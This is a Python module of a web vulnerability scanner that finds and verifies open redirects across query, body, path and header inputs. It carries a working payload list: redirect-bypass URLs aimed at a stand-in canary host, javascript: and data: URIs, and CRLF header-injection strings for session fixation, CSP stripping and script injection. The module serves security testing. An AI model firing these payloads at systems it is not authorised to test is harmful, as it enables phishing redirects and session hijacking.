"""
open_redirect.py — Open redirect discovery + verification.

Discovery surfaces (gaps 1, 2, 4, 5):
  - Query params matching name regex
  - Query params with URL-shaped current values (catches custom-named ones)
  - POST/PUT/PATCH body params (form-encoded or JSON), name OR url-shape
  - Path-segment redirects: /redirect/<dest>, /go/<url>, /r/<token>, ...
  - Header reflection: Referer, X-Forwarded-Host, Origin (opt-in via probe_headers)

Verification surfaces (gaps 6-13):
  - HTTP probe with method + body + headers preserved (gap 9, 10)
  - All bypass classes tested per param, not first-hit (gap 11)
  - Bypass payload classes augmented: data:, CRLF (gaps 6, 8)
  - Body-pattern detection: meta-refresh, window.location, location.href/replace,
    history.{push,replace}State, router.navigate*, <Navigate to=...>
  - Optional Playwright follow-up via BrowserVerifier for SPA / router redirects
    that don't surface in the raw response (gap 12)
  - auth_headers passed through for authed surfaces (gap 13 — partial; full
    login-flow probing is out of scope here, lives in auth_bypass module)

Generic by design — no app-specific paths, no challenge knowledge.
"""

import asyncio
import json as json_mod
import re
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse, quote

import httpx

import payloads


_CANARY = "evil.hxxpsin.invalid"

# ── Param-name regex ───────────────────────────────────────────────────────
_REDIRECT_PARAMS = re.compile(
    r"^(redirect|redirect_url|redirect_uri|redirecturi|next|return|return_url|"
    r"return_to|returnurl|returnuri|redir|rurl|target|dest|destination|goto|"
    r"url|link|forward|go|continue|callback|success|back|location|to|from|ref|"
    r"referer|referrer|out|nav|view|page|src|target_url|launch|open|jump|"
    r"image_url|image|file|path|cb|r|u)$",
    re.IGNORECASE,
)

# A param value that LOOKS like a URL even if its name is non-canonical.
_URL_SHAPED_VALUE_RE = re.compile(
    r"^(?:https?://|//[A-Za-z0-9]|/[A-Za-z0-9_\-./])", re.IGNORECASE,
)

# Path-segment redirect: /redirect/<dest>, /go/<url>, etc.
_PATH_REDIRECT_RE = re.compile(
    r"/(?P<verb>redirect|redir|go|goto|out|jump|link|url|forward|nav|launch|r|u)/"
    r"(?P<dest>[^/?#]+)",
    re.IGNORECASE,
)

# Request-header surfaces. Many frameworks (Flask, Django, Rails, IIS, ASP.NET,
# Node frameworks behind reverse proxies) construct redirect Location values
# from these headers without sanitizing — classic Host-header / cache-poisoning
# class. Test all of them on every endpoint by default; cheap signal.
_HEADER_SURFACES = (
    # Standard host overrides (proxy chains)
    "Host",                    # rare to override but some hosts honor it
    "X-Forwarded-Host",        # Apache/Nginx proxy header — most common
    "X-Forwarded-Server",
    "X-Forwarded-Proto",       # http↔https switch via proxy header
    "X-Forwarded-For",         # mostly IP, but some apps reflect into URLs
    "Forwarded",               # RFC 7239 single-header form
    "X-Host",
    "X-HTTP-Host-Override",
    "X-Original-Host",
    # IIS / ASP.NET URL-rewrite headers
    "X-Original-URL",
    "X-Rewrite-URL",
    # Other reflection points
    "Referer",                 # login flows that send you back to Referer
    "Origin",                  # CORS preflight + some redirect logic
    "True-Client-IP",
)

_JS_URI_RE = re.compile(r"^\s*javascript:", re.IGNORECASE)
_DATA_URI_RE = re.compile(r"^\s*data:", re.IGNORECASE)

# Body-side redirect indicators
_META_REFRESH_RE = re.compile(
    r'content=["\'][^"\']*url=([^"\';\s]+)', re.IGNORECASE
)
_WINDOW_LOC_RE = re.compile(
    r'(?:window\.location|document\.location|location\.href|'
    r'location\.replace|location\.assign|history\.(?:push|replace)State)\s*'
    r'[\(\=]\s*["\']([^"\']+)["\']',
    re.IGNORECASE,
)
_SPA_NAVIGATE_RE = re.compile(
    r'(?:router\.(?:navigate|navigateByUrl|push|replace)|<Navigate\s+to=)\s*'
    r'\(?\s*["\']([^"\']+)["\']',
    re.IGNORECASE,
)


# ── Result types ───────────────────────────────────────────────────────────

@dataclass
class RedirectFinding:
    url: str
    method: str
    surface: str       # query | body | path | header
    param: str
    payload: str
    bypass_class: str
    verdict: str       # confirmed | likely | needs_browser
    confidence: float
    evidence: str
    redirect_target: str = ""

    def to_dict(self) -> dict:
        return {
            "url": self.url, "method": self.method, "surface": self.surface,
            "param": self.param, "payload": self.payload,
            "bypass_class": self.bypass_class,
            "verdict": self.verdict, "confidence": round(self.confidence, 2),
            "evidence": self.evidence, "redirect_target": self.redirect_target,
        }


@dataclass
class OpenRedirectResult:
    endpoints_tested: int = 0
    endpoints_skipped: int = 0
    skip_reasons: dict[str, int] = field(default_factory=dict)
    findings: list[RedirectFinding] = field(default_factory=list)

    @property
    def confirmed(self) -> list[RedirectFinding]:
        return [f for f in self.findings if f.verdict == "confirmed"]

    def to_dict(self) -> dict:
        return {
            "endpoints_tested": self.endpoints_tested,
            "endpoints_skipped": self.endpoints_skipped,
            "skip_reasons": dict(self.skip_reasons),
            "confirmed": len(self.confirmed),
            "findings": [f.to_dict() for f in self.findings],
        }


# ── Bypass-class payload templates ─────────────────────────────────────────
# Each template uses {C}=canary host, {T}=target host. We test ONE per class
# per param so the matrix stays bounded; a tiny PAT-corpus sample provides
# extra real-world variants.
#
# Each class targets a specific allowlist-bypass technique observed in the
# wild (PortSwigger / OWASP / hackerone disclosures). Generic patterns —
# no app-specific knowledge.
_BYPASS_TEMPLATES: dict[str, str] = {
    # Basic
    "basic-double-slash":   "//{C}/",
    "basic-https":          "https://{C}/",
    "triple-slash":         "///{C}/",
    "quad-slash":           "////{C}/",

    # Authority confusion (RFC-3986 userinfo @)
    "authority-bypass":     "https://{T}@{C}/",
    "authority-double":     "//{T}@{C}/",
    "authority-encoded-at": "https://{T}%40{C}/",

    # Subdomain / path / query allowlist confusion
    "target-as-subdomain":  "https://{T}.{C}/",
    "target-in-path":       "https://{C}/{T}",
    "target-in-query":      "https://{C}/?{T}=1",

    # Scheme tricks
    "scheme-no-slashes":    "https:{C}/",
    "scheme-mix-backslash": "\\{C}/",
    "mixed-slash-back":     "/\\/{C}/",
    "javascript-uri":       "javascript:alert(1)",
    "javascript-mixed":     "JaVaScRiPt:alert(1)",
    "javascript-tab":       "java%09script:alert(1)",
    "javascript-newline":   "java%0Ascript:alert(1)",
    "data-uri":             "data:text/html,<script>alert(1)</script>",

    # Encoding evasion
    "backslash":            "/\\{C}/",
    "double-backslash":     "\\\\{C}/",
    "encoded-slash":        "/%2f%2f{C}/",
    "encoded-mixed":        "/%2f/{C}/",
    "double-url-encoded":   "/%252f%252f{C}/",
    "encoded-backslash":    "/%5c%5c{C}/",

    # Whitespace / control-character injection
    "whitespace-tab":       "/%09/{C}",
    "whitespace-nl":        "/%0a/{C}",
    "whitespace-nbsp":      "/%a0/{C}",

    # Truncation / null-byte
    "null-byte-trunc":      "//{C}%00.{T}/",
    "null-byte-path":       "//{T}%00@{C}/",

    # Unicode / IDN homograph
    "fullwidth-slash":      "／／{C}/",        # U+FF0F FULLWIDTH SOLIDUS
    "ideographic-period":   "//{C}。com/",         # U+3002 IDEOGRAPHIC FULL STOP

    # Fragment / hash confusion
    "fragment-bypass":      "http://{C}#@{T}/",
    "fragment-target":      "http://{T}#{C}/",

    # CRLF / response splitting.
    #
    # Mechanism: payload is reflected into the response Location header. If
    # the server doesn't strip CR/LF, the injected newlines terminate the
    # Location line and let us plant additional response headers below it.
    #
    # The payload is the VALUE going into a redirect-param (?to=, body, path).
    # No leading "/" needed for the common case (direct value reflection); a
    # few entries DO start with "/" because some servers prepend a base path
    # before reflecting (Location: /app/<value>) and the leading slash helps
    # the splitter terminate cleanly.
    #
    # Encoding variants (different parsers split on different byte sequences):
    "crlf-standard":        "%0d%0aLocation:%20//{C}/",
    "crlf-lf-only":         "%0aLocation:%20//{C}/",
    "crlf-cr-only":         "%0dLocation:%20//{C}/",
    "crlf-double-encoded":  "%250d%250aLocation:%20//{C}/",
    "crlf-utf8-nel":        "%c2%85Location:%20//{C}/",         # U+0085 NEL
    "crlf-unicode-ls":      "%e2%80%a8Location:%20//{C}/",      # U+2028 LINE SEP
    "crlf-unicode-ps":      "%e2%80%a9Location:%20//{C}/",      # U+2029 PARA SEP
    "crlf-mixed-order":     "%0a%0dLocation:%20//{C}/",
    # Header-injection variants — each plants ONE specific response header:
    "crlf-set-cookie":      "%0d%0aSet-Cookie:%20sid=evil",          # session fixation
    "crlf-refresh":         "%0d%0aRefresh:%200;url=//{C}/",         # alt-redirect
    "crlf-csp-strip":       "%0d%0aContent-Security-Policy:%20",     # XSS pivot enabler
    "crlf-xfo-strip":       "%0d%0aX-Frame-Options:%20ALLOW",        # clickjacking pivot
    "crlf-cache-poison":    "%0d%0aX-Forwarded-Host:%20{C}",         # cache-key confusion
    "crlf-x-cache-key":     "%0d%0aX-Cache-Key:%20//{C}",
    "crlf-auth-inject":     "%0d%0aAuthorization:%20Bearer%20stolen",
    # Body injection — terminate headers entirely (\r\n\r\n) then write body:
    "crlf-body-inject":     "%0d%0a%0d%0a<script>document.location='//{C}/'</script>",
}

_PAT_SAMPLE_SIZE = 20  # supplemental payloads from PAT corpus


def _build_payloads(target_host: str) -> list[tuple[str, str]]:
    out: list[tuple[str, str]] = []
    for cls, tmpl in _BYPASS_TEMPLATES.items():
        out.append((cls, tmpl.format(C=_CANARY, T=target_host)))
    for raw in payloads.open_redirect()[:_PAT_SAMPLE_SIZE]:
        out.append(("pat-corpus",
                    raw.replace("example.com", _CANARY).replace("google.com", _CANARY)))
    return out


# ── Surface enumeration ────────────────────────────────────────────────────

@dataclass
class _Target:
    url: str
    method: str
    surface: str
    param: str
    finding: object


def _is_redirect_param(name: str, value: str) -> bool:
    return bool(_REDIRECT_PARAMS.match(name)) or bool(_URL_SHAPED_VALUE_RE.match(value or ""))


def _enumerate_query(f) -> list[_Target]:
    parsed = urlparse(f.url)
    out: list[_Target] = []
    for k, v in parse_qsl(parsed.query, keep_blank_values=True):
        if _is_redirect_param(k, v):
            out.append(_Target(f.url, (f.method or "GET").upper(), "query", k, f))
    return out


def _enumerate_body(f) -> list[_Target]:
    body = getattr(f, "body", None)
    if not body:
        return []
    method = (f.method or "GET").upper()
    if method not in {"POST", "PUT", "PATCH"}:
        return []
    out: list[_Target] = []
    # JSON
    try:
        obj = json_mod.loads(body)
        if isinstance(obj, dict):
            for k, v in obj.items():
                if isinstance(v, str) and _is_redirect_param(k, v):
                    out.append(_Target(f.url, method, "body", k, f))
            return out
    except (ValueError, TypeError):
        pass
    # Form-encoded
    try:
        for k, v in parse_qsl(body, keep_blank_values=True):
            if _is_redirect_param(k, v):
                out.append(_Target(f.url, method, "body", k, f))
    except Exception:
        pass
    return out


def _enumerate_path(f) -> list[_Target]:
    parsed = urlparse(f.url)
    if not _PATH_REDIRECT_RE.search(parsed.path):
        return []
    return [_Target(f.url, (f.method or "GET").upper(), "path", "<path-segment>", f)]


def _enumerate_headers(f) -> list[_Target]:
    method = (f.method or "GET").upper()
    return [_Target(f.url, method, "header", h, f) for h in _HEADER_SURFACES]


# ── URL surgery (no double-encoding of payloads) ───────────────────────────

def _replace_query_param(url: str, param: str, raw_payload: str) -> str:
    """Replace a single query param's value with the raw payload, preserving
    encoding of the OTHER params and not double-encoding the payload itself."""
    parsed = urlparse(url)
    pairs = parse_qsl(parsed.query, keep_blank_values=True)
    new_qs_parts: list[str] = []
    replaced = False
    for k, v in pairs:
        if k == param and not replaced:
            # Only escape chars httpx absolutely won't tolerate; keep //, :, @, % intact.
            new_qs_parts.append(f"{k}={quote(raw_payload, safe='/:@%?#&=+')}")
            replaced = True
        else:
            new_qs_parts.append(f"{k}={quote(v, safe='/:@%')}")
    if not replaced:
        new_qs_parts.append(f"{param}={quote(raw_payload, safe='/:@%?#&=+')}")
    return urlunparse(parsed._replace(query="&".join(new_qs_parts)))


def _replace_path_segment(url: str, raw_payload: str) -> str:
    parsed = urlparse(url)
    new_path = _PATH_REDIRECT_RE.sub(
        lambda m: f"/{m.group('verb')}/{quote(raw_payload, safe='/:@%?#&=+')}",
        parsed.path,
        count=1,
    )
    return urlunparse(parsed._replace(path=new_path))


def _mutate_body(body: Optional[str], param: str, payload: str,
                 content_type: str) -> Optional[bytes]:
    if not body:
        return None
    ct = (content_type or "").lower()
    if "json" in ct:
        try:
            obj = json_mod.loads(body)
            if isinstance(obj, dict) and param in obj:
                obj[param] = payload
                return json_mod.dumps(obj).encode()
        except (ValueError, TypeError):
            pass
    try:
        kv = dict(parse_qsl(body, keep_blank_values=True))
        if param in kv:
            kv[param] = payload
            return urlencode(kv).encode()
    except Exception:
        pass
    return body.encode()  # leave intact if we can't parse


# ── Probing ────────────────────────────────────────────────────────────────

class OpenRedirectProbe:
    def __init__(
        self,
        auth_headers: Optional[dict] = None,
        timeout: float = 8.0,
        browser_verifier=None,
        probe_headers: bool = True,
    ):
        self.auth_headers = auth_headers or {}
        self.timeout = timeout
        self.browser_verifier = browser_verifier
        self.probe_headers = probe_headers

    async def run(self, findings) -> OpenRedirectResult:
        result = OpenRedirectResult()

        targets: list[_Target] = []
        for f in findings:
            targets.extend(_enumerate_query(f))
            targets.extend(_enumerate_body(f))
            targets.extend(_enumerate_path(f))
            if self.probe_headers:
                targets.extend(_enumerate_headers(f))

        # Dedupe (url, method, surface, param)
        seen: set[tuple] = set()
        unique: list[_Target] = []
        for t in targets:
            key = (t.url, t.method, t.surface, t.param)
            if key not in seen:
                seen.add(key)
                unique.append(t)
        if not unique:
            return result

        async with httpx.AsyncClient(
            verify=False,
            follow_redirects=False,
            timeout=self.timeout,
            headers=self.auth_headers,
        ) as client:
            # Baseline reachability check: don't probe dead/unreachable endpoints
            # (avoids fabricating "no vuln" verdicts on 404'd or auth-walled URLs).
            baseline_results = await asyncio.gather(
                *[self._baseline_check(client, t) for t in unique],
                return_exceptions=True,
            )
            live_targets: list[_Target] = []
            for t, baseline in zip(unique, baseline_results):
                if isinstance(baseline, Exception):
                    result.endpoints_skipped += 1
                    result.skip_reasons["error"] = result.skip_reasons.get("error", 0) + 1
                    continue
                status, code = baseline
                if status == "live":
                    live_targets.append(t)
                else:
                    result.endpoints_skipped += 1
                    label = f"{status}({code})" if code else status
                    result.skip_reasons[label] = result.skip_reasons.get(label, 0) + 1

            result.endpoints_tested = len(live_targets)
            if not live_targets:
                return result

            tasks = [self._probe_target(client, t) for t in live_targets]
            per_target = await asyncio.gather(*tasks, return_exceptions=True)
        for hits in per_target:
            if isinstance(hits, list):
                result.findings.extend(hits)

        if self.browser_verifier and getattr(self.browser_verifier, "available", False):
            await self._browser_upgrade(result, live_targets)

        return result

    async def _baseline_check(self, client: httpx.AsyncClient, t: _Target
                                ) -> tuple[str, Optional[int]]:
        """Decide whether `t.url` is worth probing.

        Returns (status, http_code) where status is one of:
          live       — probe it
          dead       — 404/410/405; skip
          needs_auth — 401/403 without creds; skip
          error      — connection failed; skip

        Uses the crawler-cached `response_status` when present (free); falls
        back to a HEAD request otherwise.
        """
        f = t.finding
        cached = getattr(f, "response_status", None)
        if cached is not None:
            return self._classify_status(cached)
        try:
            r = await client.request(
                "HEAD" if t.method == "GET" else t.method,
                t.url,
                headers={k: v for k, v in (f.headers or {}).items()
                         if k.lower() not in {"content-length", "host"}},
            )
        except Exception:
            return ("error", None)
        return self._classify_status(r.status_code)

    def _classify_status(self, code: int) -> tuple[str, int]:
        if code in (404, 410, 405):
            return ("dead", code)
        if code in (401, 403) and not self.auth_headers:
            return ("needs_auth", code)
        return ("live", code)

    async def _probe_target(self, client: httpx.AsyncClient, t: _Target
                             ) -> list[RedirectFinding]:
        target_host = urlparse(t.url).netloc.split(":")[0]
        bypasses = _build_payloads(target_host)
        hits: list[RedirectFinding] = []
        for bypass_class, payload in bypasses:
            try:
                req = self._build_request(t, payload)
                r = await client.send(req)
            except httpx.InvalidURL:
                # httpx parses the response's Location header even with
                # follow_redirects=False, and barfs on non-http(s) schemes.
                # For javascript-* / data-* payloads, that crash IS the signal:
                # the server reflected an unsafe scheme into Location. Covers
                # mixed-case, tab-injected, and newline-injected variants.
                if bypass_class.startswith(("javascript-", "data-")):
                    hits.append(RedirectFinding(
                        url=t.url, method=t.method, surface=t.surface,
                        param=t.param, payload=payload, bypass_class=bypass_class,
                        verdict="confirmed", confidence=0.85,
                        evidence=(f"server reflected {bypass_class} scheme into "
                                  f"Location (httpx URL parse error)"),
                        redirect_target="<unparseable scheme>",
                    ))
                continue
            except Exception:
                continue
            hit = _check_response(t, payload, bypass_class, r)
            if hit:
                hits.append(hit)
        return hits

    def _build_request(self, t: _Target, payload: str) -> httpx.Request:
        f = t.finding
        headers = {k: v for k, v in (f.headers or {}).items()
                   if k.lower() not in {"content-length", "host"}}
        headers.update(self.auth_headers)

        if t.surface == "query":
            url = _replace_query_param(t.url, t.param, payload)
            return httpx.Request(t.method, url, headers=headers,
                                 content=(f.body.encode() if f.body else None))

        if t.surface == "body":
            ct = headers.get("Content-Type") or headers.get("content-type") or ""
            body_bytes = _mutate_body(f.body, t.param, payload, ct)
            return httpx.Request(t.method, t.url, headers=headers, content=body_bytes)

        if t.surface == "path":
            url = _replace_path_segment(t.url, payload)
            return httpx.Request(t.method, url, headers=headers,
                                 content=(f.body.encode() if f.body else None))

        if t.surface == "header":
            headers[t.param] = payload
            return httpx.Request(t.method, t.url, headers=headers,
                                 content=(f.body.encode() if f.body else None))

        raise ValueError(f"unknown surface: {t.surface}")

    async def _browser_upgrade(self, result: OpenRedirectResult,
                                targets: list[_Target]) -> None:
        """For each finding that's body-based or 'needs_browser', re-probe via
        Playwright to catch SPA / router-driven redirects."""
        # Identify findings that are not yet 'confirmed' per (url, method, surface, param).
        weakest: dict[tuple, RedirectFinding] = {}
        confirmed_keys: set[tuple] = set()
        for f in result.findings:
            key = (f.url, f.method, f.surface, f.param)
            if f.verdict == "confirmed":
                confirmed_keys.add(key)
                continue
            if key not in weakest or f.confidence > weakest[key].confidence:
                weakest[key] = f

        target_index = {(t.url, t.method, t.surface, t.param): t for t in targets}

        # Browser navigation only makes sense for GET-able surfaces.
        for key, weak in weakest.items():
            if key in confirmed_keys:
                continue
            t = target_index.get(key)
            if not t or t.surface not in {"query", "path"}:
                continue
            target_host = urlparse(t.url).netloc.split(":")[0]
            payload = f"//{_CANARY}/"
            try:
                if t.surface == "query":
                    probe_url = _replace_query_param(t.url, t.param, payload)
                else:
                    probe_url = _replace_path_segment(t.url, payload)
                br = await self.browser_verifier.verify_redirect(
                    probe_url,
                    target_origin=f"{urlparse(t.url).scheme}://{target_host}",
                    auth_headers=self.auth_headers,
                )
            except Exception:
                continue
            if getattr(br, "verdict", "") == "confirmed":
                weak.verdict = "confirmed"
                weak.confidence = max(weak.confidence, br.confidence)
                weak.evidence = f"browser-verified ({weak.evidence}): {br.evidence}"
                weak.redirect_target = br.final_url


# ── Response analysis ──────────────────────────────────────────────────────

def _check_response(t: _Target, payload: str, bypass_class: str,
                     r: httpx.Response) -> Optional[RedirectFinding]:
    location = r.headers.get("location", "")
    body = r.text[:4000] if r.content else ""

    def mk(verdict: str, conf: float, evidence: str, target: str = "") -> RedirectFinding:
        return RedirectFinding(
            url=t.url, method=t.method, surface=t.surface, param=t.param,
            payload=payload, bypass_class=bypass_class,
            verdict=verdict, confidence=conf,
            evidence=evidence, redirect_target=target or location,
        )

    # 0. CRLF / response-splitting payloads need to look at MORE than Location.
    #    A successful split injects a brand-new header into the response.
    if bypass_class.startswith("crlf-"):
        # Multiple Location headers → response was split into two responses
        locations = [v for k, v in r.headers.items() if k.lower() == "location"]
        if len(locations) > 1:
            return mk("confirmed", 0.95,
                      f"Multiple Location headers (response split): {locations}",
                      str(locations))
        # Look for an injected header containing the canary or attacker value
        for h_name, h_value in r.headers.items():
            if h_name.lower() == "location":
                continue
            v_lower = h_value.lower()
            if _CANARY in h_value or "stolen" in v_lower or "sid=evil" in v_lower:
                return mk("confirmed", 0.95,
                          f"Header injection succeeded — {h_name}: {h_value}", h_value)
        # Refresh header injected (alt to Location)
        if "refresh" in r.headers:
            return mk("confirmed", 0.9,
                      f"Refresh header injected: {r.headers['refresh']}", "")
        # Set-Cookie injection from our payload
        sc = r.headers.get("set-cookie", "")
        if "evil" in sc.lower() or _CANARY in sc:
            return mk("confirmed", 0.95,
                      f"Set-Cookie injection succeeded: {sc}", sc)
        # Body-inject variant: requires the LITERAL injected tag to land in
        # the response body (not HTML-escaped). Otherwise the canary just
        # echoed back inside an error page and that's not a real split.
        if "crlf-body-inject" in bypass_class:
            body_lower = body.lower()
            if "<script" in body_lower and "document.location" in body_lower \
               and _CANARY in body:
                return mk("confirmed", 0.9,
                          "Body-injected via response splitting "
                          "(literal <script> with canary)", "")
        # Fall through to common Location checks below

    # 1. javascript: / data: URI → critical
    if location and _JS_URI_RE.match(location):
        return mk("confirmed", 0.95, "javascript: URI in Location header", location)
    if location and _DATA_URI_RE.match(location):
        return mk("confirmed", 0.95, "data: URI in Location header", location)

    # 2. CRLF injection — Location header containing literal CR/LF means
    #    upstream didn't sanitize and we can split the response.
    if location and ("\n" in location or "\r" in location):
        return mk("confirmed", 0.9,
                  "CRLF in Location header (response splitting / Set-Cookie injection)",
                  location)

    # 3. Canary in Location
    if location and _CANARY in location:
        return mk("confirmed", 0.9, f"Open redirect: Location → {location}", location)

    # 4. Any external domain in Location with 3xx status
    if location and 300 <= r.status_code < 400:
        loc_netloc = urlparse(location).netloc or urlparse("http:" + location).netloc
        own_netloc = urlparse(t.url).netloc
        if loc_netloc and loc_netloc != own_netloc and _CANARY not in loc_netloc:
            return mk("likely", 0.5, f"External domain in redirect: {location}", location)

    # 5. Body-based redirects — meta-refresh, JS location, SPA router
    for rx, label in (
        (_META_REFRESH_RE, "meta-refresh"),
        (_WINDOW_LOC_RE,   "JS location"),
        (_SPA_NAVIGATE_RE, "SPA router"),
    ):
        m = rx.search(body)
        if not m:
            continue
        target = m.group(1)
        if _CANARY in target:
            return mk("confirmed", 0.85,
                      f"Open redirect via {label} → {target}", target)
        if target.startswith(("http://", "https://", "//")):
            t_netloc = urlparse(target if "://" in target else f"http:{target}").netloc
            own = urlparse(t.url).netloc
            if t_netloc and t_netloc != own:
                return mk("needs_browser", 0.4,
                          f"Likely {label} → {target} (browser verify)", target)

    return None
